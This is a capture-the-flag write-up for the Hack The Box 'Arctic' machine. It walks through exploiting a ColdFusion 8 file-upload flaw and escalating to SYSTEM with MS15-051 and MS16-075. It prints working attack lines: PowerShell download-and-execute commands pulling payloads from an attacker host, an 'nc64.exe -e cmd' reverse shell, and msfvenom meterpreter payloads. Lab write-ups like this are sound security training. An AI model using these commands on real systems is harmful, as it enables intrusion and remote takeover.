
![logo](/logo.png)

# [Arctic- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 22 Mar 2017 as the ninth machine on HTB,Arctic created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *msrpc
  *ColdFusion 8
  *Windows Rpc
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/artic 10.10.10.11
```

![](/Windows/Windows-Easy/Arctic/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/arctic 10.10.10.11                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 13:31 EAT
Nmap scan report for 10.10.10.11
Host is up (0.33s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.85 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Microsoft Windows RPC `and its running  `Windows`. 

port[135]-msrpc
port[8500]- fmtp
port[49154]-msrpc

so let go to the port which we do not now of `8500` and it revels a directory 

![](/Windows/Windows-Easy/Arctic/Screenshots/directory.png)

so when openning the `CFIDE` it revels certain file

![](/Windows/Windows-Easy/Arctic/Screenshots/Admin.png)

so when checking each file by clicking the `Administrator` it opens and application called `Coldfusion` 

![](/Windows/Windows-Easy/Arctic/Screenshots/coldfusion.png)
so we test some default credential but does not return any thing so we do a `searchsploit ` to search for `coldfusion 8`

```sh
searchsploit coldfusion 8 
```

![](/Windows/Windows-Easy/Arctic/Screenshots/searchsploit.png)

we find that their are a bunch of exploit but what is most interesting is the one that can be done with `metasploit` 

# Exploitation


![](/Windows/Windows-Easy/Arctic/Screenshots/metasploit.png)

```sh
show option
set RHOSTS 10.10.10.11
set RPORT 8500
set LHOST 10.10.14.9
set LPORT 4444
```

![](/Windows/Windows-Easy/Arctic/Screenshots/failed.png)

running that it failes because of the amount of time it takes for the session to respond so what will do is to examine the exploit in burpsuite so that we can be able to interact with the exploit. So we add another proxy listner so that we can listen from the our metasploit.

![](/Windows/Windows-Easy/Arctic/Screenshots/burp.png)

Now we change our `RHOSTs` from the metasploit so that we can intercept on the exploit to eamine how it was going to execute it. 

![](/Windows/Windows-Easy/Arctic/Screenshots/proxies.png)

![](/Windows/Windows-Easy/Arctic/Screenshots/burpexpoit.png)


now we can see the request it trying to make 

```sh
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/ZU.jsp%00 HTTP/1.1
```

so  where the exploit came in is `Zu.jsp%00` which is a string termination. Now we send the exploit ia burp and we can see on the Response that a sucess message

![](/Windows/Windows-Easy/Arctic/Screenshots/burprespone.png)

Now we set a listener and navigate to that file 

```sh
nc -nvlp 4444
```

![](/Windows/Windows-Easy/Arctic/Screenshots/navigate.png)

we get a reverseshell back

![](/Windows/Windows-Easy/Arctic/Screenshots/reverse.png)

# Privillage Escalation

Now we check for systeminfo to check for any `hotfixes`

![](/Windows/Windows-Easy/Arctic/Screenshots/systeminfo.png)

Now we search and find that their is script that checks for vulnerablitities of missing software patches for local privilege escalation vulnerabilities. [sherlork](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) now we save the script and be able to execute if so that we can run.

from the script just copy the function find Allvulns and put at the end of the script them from the session run

```sh
powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')"
```

![](/Windows/Windows-Easy/Arctic/Screenshots/sherlork.png)

## MS15-051 UPLOAD

From `sherlork` we can then upload an `Ms15-051` exe so that we can execute the exploit.so we download this zip which has a good `ms15-051`  for 64 Vulnerability [ZIP](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) Then we run this code so that we can upload the `mS15-051` and also execute to check if it working.

```sh
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/Ms15.exe','Ms15.exe')"
```

![](/Windows/Windows-Easy/Arctic/Screenshots/MS15.png)

Then when we execute it with `whoami` we get that we can execute `NT\Authority`

![](/Windows/Windows-Easy/Arctic/Screenshots/whoami.png)

isnce we can execute some command using that we need a permanet shell that is easy to use so what we can do is to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) so we upload the `nc64.exe` so that by using it we can be able to get a root privillage.

```sh
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/nc64.exe','nc64.exe')"
```

so we create a listner and also run this code 

```sh
.\Ms15.exe "nc64.exe -e cmd 10.10.14.9 1339"
```

![](/Windows/Windows-Easy/Arctic/Screenshots/ms15ex.png)

and just by that we get the root privillage.

![](/Windows/Windows-Easy/Arctic/Screenshots/rootpriv.png)

and just by that we can get the user flag in `C:\users\tolis\desktop\user.txt` and root flag on 

![](/Windows/Windows-Easy/Arctic/Screenshots/flags.png)
## METERPRETER

it execute but nothing of impormtance so what we do is to be able to load a meterpreter shell with this exploit form [unicorn](https://github.com/trustedsec/unicorn/blob/master/unicorn.py)  or using `msvenom`

```sh
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.9 lport=4242 -f exe > shell.exe 
```

![](/Windows/Windows-Easy/Arctic/Screenshots/msvenom.png)

so we set a listner so as to listern for the shell

```sh
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.9
set LPORT 4242
run
```

![](/Windows/Windows-Easy/Arctic/Screenshots/metapreter.png)

now we run this to the session of cold fusion

```sh
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/shell.exe','shell.exe')"
```

![](/Windows/Windows-Easy/Arctic/Screenshots/exploitdownload.png)

from the python server we see that it has uploaded the shell

![](/Windows/Windows-Easy/Arctic/Screenshots/pyhonserver.png)

so we run the shell.exe to get the meterpreter

![](/Windows/Windows-Easy/Arctic/Screenshots/shell.png)

![](/Windows/Windows-Easy/Arctic/Screenshots/meterpreter.png)

it running a 32bit meterpreter 

![](/Windows/Windows-Easy/Arctic/Screenshots/32Bit.png)

now we send the session to the background so that we can use `Suggester`  to search for exploits 

```sh
background
search suggester
use 0
show options
set SESSION 1
run
```

![](/Windows/Windows-Easy/Arctic/Screenshots/suggester.png)

![](/Windows/Windows-Easy/Arctic/Screenshots/potentialexploits.png)

now we save the exploit in some files and we go back to be able to use meterpreter of 64 version

![](/Windows/Windows-Easy/Arctic/Screenshots/migratec.png)

so we are going to migrate to `conhost`

```sh
migrate 1164
```

![](/Windows/Windows-Easy/Arctic/Screenshots/migrateto.png)

so its now on 64 metrepreter so we will run again suggester

![](/Windows/Windows-Easy/Arctic/Screenshots/64bit.png)

i decide to use this exploit `ms16_075`

```sh
use exploit/windows/local/ms16_075_reflection_juicy
show options
sessions -i
set SESSION 1
set LHOST 10.10.14.9
set LPORT 1347
```

![](/Windows/Windows-Easy/Arctic/Screenshots/ms075.png)

and you get the privillage shell witn `NT/Authority`

### Another way to get Shell

```sh
python unicorn.py windows/meterpreter/reverse_tcp 10.10.14.9 31337  
```

it generates two file and instruction on starting metasploit.

![](/Windows/Windows-Easy/Arctic/Screenshots/unicorn.png)

```sh
msfconsole -r unicorn.rc
```

it starts metapreter listenning 

![](/Windows/Windows-Easy/Arctic/Screenshots/exploit.png)


so we save the content of  `powershell_attack.txt` to a new file called the exploit.html and remove the powershell so that we can be able to make it executable by inline code

```sh
powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/exploit.html')"
```